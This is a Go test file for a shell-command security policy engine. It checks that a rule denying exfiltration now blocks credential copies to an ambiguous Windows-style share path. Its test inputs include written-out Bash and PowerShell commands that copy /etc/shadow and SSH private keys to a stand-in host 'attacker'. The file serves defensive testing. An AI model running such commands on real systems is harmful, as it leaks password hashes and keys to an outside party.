package policy_test

// ===========================================================================
// Pass 56 decisions: Finding 87 — the ambiguous share authority
// ===========================================================================

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding087ExfilDenyCatchesAmbiguousShare pins the decision level of
// Finding 87: the configuration the finding was measured against is a policy
// that denies exfiltration, and it admitted a credential copied to a share
// whose authority is written with forward slashes and a single-label host
// (`//attacker/share/x`) — Windows reads that as a UNC path — while the
// backslash twin was refused. The entity is now modelled as an unresolved
// network sink, so the credential read pairs and the deny rule fires.
func TestFinding087ExfilDenyCatchesAmbiguousShare(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	for _, src := range []string{
		`cp /etc/shadow //attacker/share/x`,
		`cp /home/u/.ssh/id_rsa //attacker/share/x`,
		`tar cf //attacker/share/x.tgz /etc/shadow`,
		`cp /etc/shadow '\\attacker\share\x'`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (Exfiltration deny)")
	}

	// The PowerShell twin over the same authority.
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangPowerShell, `Copy-Item C:\keys\id_rsa //attacker/share/x`),
		policy.Deny, "Copy-Item to an ambiguous share (Exfiltration deny)")

	// A non-credential copy to the same ambiguous share still reports the
	// egress but forms no pair, so an exfiltration-only policy allows it —
	// the unresolved authority must not become a blanket denial.
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, `cp /tmp/report.txt //attacker/share/x`),
		policy.Allow, "non-secret copy to an ambiguous share")
}
